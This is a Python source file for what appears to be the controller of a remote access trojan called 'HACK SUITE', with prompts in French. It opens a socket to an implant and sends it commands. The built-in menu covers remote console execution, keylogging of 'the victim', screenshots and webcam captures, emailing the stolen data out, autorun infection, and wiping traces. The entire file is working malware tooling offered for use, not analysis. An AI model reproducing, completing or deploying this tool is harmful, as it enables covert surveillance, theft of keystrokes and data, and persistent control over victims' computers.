import socket
import os
from clint.textui import colored, puts

def logo():
	print("")
	puts(colored.green(" 88888888b oo       dP dP                         dP       d8          "))
	puts(colored.green(" 88                 88 88                         88       88          "))
	puts(colored.green("a88aaaa    dP .d888b88 88  .dP  88d888b. .d8888b. 88d888b. .P .d8888b. "))
	puts(colored.green(" 88        88 88'  `88 88888    88'  `88 88'  `88 88'  `88    Y8ooooo. "))
	puts(colored.green(" 88        88 88.  .88 88  `8b. 88    88 88.  .88 88.  .88          88 "))
	puts(colored.green(" 88888888P dP `88888P8 dP   `YP dP    dP `88888P8 88Y8888'    `88888P' "))
	puts(colored.green("ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"))
	print("")
	puts(colored.white("                            HACK SUITE                                "))
	print("")
	puts(colored.white("                     https://github.com/Eidknab/                      "))
	print("")
	print("")

os.system("cls")
logo()
i = 0 
while i < 1:
	hote = input("Adresse IP (par défaut localhost):")
	if hote == "":
		hote = "localhost"
		print("Vous avez choisi " + hote + " comme hote.")
	else:
		pass
	port = input("Port (par défaut 1666)")
	if port == "":
		port = 1666
	else:
		pass
	try:
		port = int(port)
		print("Vous avez choisi ", port, " comme port.")
		i = i + 1
	except:
		print("Input Error")
	try: 
		connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connexion_avec_serveur.connect((hote, port))
	except:
		print("Connexion impossible sur {}:{}".format(hote, port))
		i = 0

os.system("cls")
logo()
print("Connexion établie avec le serveur sur {}:{}".format(hote, port))
print("")
print("Liste des commandes: \n- cmd (permet l'utilisation des commandes consoles. Exemple: cmd cls) \
	\n- clean (pour effacer toutes traces... Exemple: screenshots, camshots, keylogs...)\
	\n- mail mailpw smtpadr smtpport (paramètres conernants la reception de données par mail de la victime)\
	\n- kelloggs (enregistre toutes les frappes au clavier de la victime. Le serveur devient oqp)\
	\n- scr camshot (prendre un screenshot ou une image de la webcam de la victime) \
	\n- rcv (recevoir toutes les données collectées par mail) \
	\n- infect (autorun, besoin d'un mode admin) \
	\n- quit")
msg_a_envoyer = b""

while msg_a_envoyer != b"quit":
	msg_a_envoyer = input("> ")
	# Peut planter si vous tapez des caractères spéciaux
	msg_a_envoyer = msg_a_envoyer.encode()
	# On envoie le message
	try:
		connexion_avec_serveur.send(msg_a_envoyer)
		msg_recu = connexion_avec_serveur.recv(1024)
		print(msg_recu.decode()) # Là encore, peut planter s'il y a des accents
	except:
		print("connexion perdue !")

print("Fermeture de la connexion")
try:
	connexion_avec_serveur.close()
except:
	os.system("exit")